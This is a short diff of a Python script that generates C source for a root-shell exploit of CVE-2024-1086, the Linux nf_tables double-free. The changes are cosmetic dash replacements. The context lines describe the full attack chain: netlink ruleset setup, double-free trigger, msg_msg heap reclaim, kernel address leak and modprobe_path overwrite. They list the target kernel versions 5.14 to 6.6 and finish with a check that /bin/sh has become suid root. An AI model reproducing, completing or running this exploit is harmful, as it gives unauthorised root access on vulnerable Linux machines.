@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""CVE-2024-1086 — nf_tables double-free, full root-shell exploit.
+"""CVE-2024-1086 -- nf_tables double-free, full root-shell exploit.
 Emits nft_uaf_full.c: builds the ruleset over netlink, triggers the double-
 free, reclaims with msg_msg, leaks, overwrites modprobe_path, triggers it.
 
@@ -9,7 +9,7 @@ import sys
 from pathlib import Path
 
 C = r'''
-/* cve-2024-1086 — nf_tables nft_verdict double-free -> root.
+/* cve-2024-1086 -- nf_tables nft_verdict double-free -> root.
  * Stages: 1) ruleset  2) trigger double-free  3) reclaim via msg_msg
  *         4) leak kbase/heap  5) overwrite modprobe_path  6) run it.
  * Targets Linux 5.14..6.6 with nftables. Offsets/struct layout vary per build.
@@ -117,7 +117,7 @@ int main(void) {
     overwrite_modprobe();
     trigger_modprobe();
 
-    printf("[+] done — check /bin/sh perms (suid root) or re-run getuid\n");
+    printf("[+] done -- check /bin/sh perms (suid root) or re-run getuid\n");
     run("ls -l /bin/sh");
     return 0;
 }
